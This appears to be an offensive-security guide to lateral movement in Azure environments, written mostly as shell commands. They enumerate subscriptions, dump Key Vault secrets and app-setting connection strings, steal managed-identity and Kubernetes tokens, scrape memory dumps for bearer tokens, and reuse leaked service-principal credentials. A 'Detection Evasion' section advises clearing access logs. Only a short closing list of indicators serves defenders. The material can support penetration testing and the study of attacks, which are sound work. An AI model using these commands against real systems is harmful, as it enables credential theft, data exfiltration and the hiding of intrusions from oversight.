# Azure Lateral Movement

Lateral movement involves accessing resources beyond the initial entry point. This includes moving between subscriptions, resource groups, and accessing data across the environment.

## Subscription Traversal

```bash
# List accessible subscriptions
az account list --output table

# Switch to different subscription
az account set --subscription {subscriptionId}

# Check permissions in target subscription
az role assignment list --scope /subscriptions/{subscriptionId}

# Access resources in different subscription
az resource list --subscription {subscriptionId}
```

## Cross-Subscription Movement

### Via Service Principal with Multi-Subscription Access

```bash
# Service principal may have permissions across multiple subscriptions
# Often due to overly broad role assignments

# Enumerate across subscriptions
for sub in $(az account list --query '[].id' -o tsv); do
  echo "=== Subscription: $sub ==="
  az resource list --subscription $sub --query '[].name' -o tsv
done
```

### Via Shared Resources

```bash
# Shared storage accounts accessible across subscriptions
# Often contain sensitive data

# Access shared Key Vault
az keyvault secret list --vault-name {sharedVault}

# Access shared storage
az storage container list --account-name {sharedAccount}

# Access shared managed database
az sql db show --name {sharedDb} --server {server} --resource-group {rg}
```

## Resource Access Escalation

### Storage Account Lateral Movement

```bash
# From one storage account to another
# Often contain connection strings to other systems

# List blobs and search for secrets
az storage blob list --container-name {container} --account-name {account} | \
  jq '.[] | select(.name | contains("secret") or contains("password") or contains("key"))'

# Access and extract secrets
az storage blob download --name {secretFile} \
  --container-name {container} \
  --account-name {account} \
  --file secret.json

# Parse for connection strings to other services
jq '.connections[] | {service, connectionString}' secret.json
```

### Database Pivot

```bash
# From compromised VM, access database server
# Using managed identity

TOKEN=$(curl -s http://169.254.169.254/metadata/identity/oauth2/token?api-version=2017-12-01&resource=https://database.windows.net/ -H "Metadata: true" | jq -r '.access_token')

# Extract database authentication token
# Use token to authenticate to SQL Database

sqlcmd -S {server}.database.windows.net -d {database} \
  -G -U {identity} -P {token} \
  -Q "SELECT * FROM sensitive_table"
```

### Key Vault Access via Cross-Service Compromise

```bash
# Compromised web app may have managed identity
# With Key Vault read access

# Extract secrets used by application
az keyvault secret list --vault-name {appKeyVault} | \
  jq '.value[] | {name, tags}'

# Get actual secrets
for secret in $(az keyvault secret list --vault-name {appKeyVault} --query '[].name' -o tsv); do
  echo "=== $secret ==="
  az keyvault secret show --vault-name {appKeyVault} --name "$secret" --query 'value'
done
```

## Application and Service Pivot

### Azure App Service to Backend Systems

```bash
# From compromised app service, access backend database
# Connection string usually in app settings

az webapp config appsettings list --name {app} --resource-group {rg} | \
  jq '.[] | select(.name | contains("CONNECTION") or contains("DATABASE"))'

# Extract and use connection string
DB_CONN=$(az webapp config appsettings list --name {app} --resource-group {rg} | \
  jq -r '.[] | select(.name=="DATABASE_CONNECTION_STRING") | .value')

sqlcmd -S {server} -U {user} -P {password} -Q "SELECT * FROM data_table"
```

### Azure Functions to Integrated Services

```bash
# Functions often connected to multiple services
# Check function configuration

az functionapp config appsettings list --name {function} --resource-group {rg} | \
  jq '.[] | select(.name | test("URL|KEY|SECRET|CONNECTION"))'

# Extract Cosmos DB connection
COSMOS_CONN=$(az functionapp config appsettings list --name {function} --resource-group {rg} | \
  jq -r '.[] | select(.name=="CosmosDBConnection") | .value')

# Connect to Cosmos DB and extract data
# Parse connection string and authenticate
```

## Kubernetes Lateral Movement (AKS)

```bash
# From compromised container, access Kubernetes cluster
# Workload identity federation may allow lateral movement

# Get cluster token
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)

# Access Kubernetes API
curl -s https://kubernetes.default.svc/api/v1/namespaces \
  -H "Authorization: Bearer $TOKEN" \
  -k

# Access other pods' service account tokens
# Mount secrets from other namespaces if RBAC permits

# Pivot to cluster-admin via service account abuse
```

## OAuth Token Exploitation for Lateral Movement

```bash
# Extract OAuth tokens from running processes
# Tokens may allow access to other Azure services

# From running app instance
./Tools/ProcessDump.exe -p {processId} -out dump.dmp

# Extract tokens from memory dump
strings dump.dmp | grep -i "token\|bearer" | head -20

# Use token for lateral movement
curl -s https://graph.microsoft.com/v1.0/users \
  -H "Authorization: Bearer {extracted_token}"
```

## Service Principal Credential Reuse

```bash
# Extract service principal credentials from source control
git log --all -S "client_secret" -p

# Or from configuration files in storage
az storage blob download --name config.json \
  --container-name {container} \
  --account-name {account} \
  --file config.json

jq '.azure | {clientId, clientSecret, tenantId}' config.json

# Authenticate as that service principal
az login --service-principal \
  --username {clientId} \
  --password {clientSecret} \
  --tenant {tenantId}
```

## Managed Identity Impersonation

```bash
# If service principal can impersonate managed identity
# Access resources that identity has access to

# List managed identities accessible to current identity
az identity list --output table

# Attempt to authenticate as managed identity
# Use managed identity's client ID and access token

TOKEN=$(curl -s http://169.254.169.254/metadata/identity/oauth2/token?api-version=2017-12-01&resource=https://management.azure.com/&client_id={managedIdentityClientId} -H "Metadata: true" | jq -r '.access_token')
```

## Detection Evasion

```bash
# Avoid excessive API calls
# Spread lateral movement across hours/days

# Use legitimate Azure tools
# Blend with normal administrative traffic

# Clean up access logs if possible
# Document lateral movement timeline for cleanup

# Reuse legitimate service accounts
# Rather than creating new ones
```

## Key Indicators of Lateral Movement

- Authentication from unusual service accounts
- Resource access patterns inconsistent with account function
- Subscription traversal by service principal
- Bulk secret extraction from Key Vault
- Database access from non-standard clients
- Cross-subscription resource access
